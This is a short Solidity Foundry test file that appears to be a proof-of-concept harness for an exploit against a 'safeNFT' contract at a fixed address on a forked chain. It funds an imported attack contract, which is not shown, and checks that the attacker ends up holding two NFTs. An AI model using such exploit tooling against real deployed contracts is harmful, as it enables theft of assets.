// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "./SafeNFT.sol";
import "./SafeNFTAttack.sol";

// For this test we will use a forked environment
contract SafeNFTPOC is Test {
  safeNFT target = safeNFT(0xf0337Cde99638F8087c670c80a57d470134C3AAE);
  SafeNFTAttack attacker = new SafeNFTAttack(0xf0337Cde99638F8087c670c80a57d470134C3AAE);

  function setUp() external {
    vm.deal(address(attacker), 0.01 ether);
  }

  function testExploit() external {
    vm.startPrank(address(attacker));

    attacker.attack();

    require(target.balanceOf(address(attacker)) == 2, "POC: invalid attacker balance");
  }
}
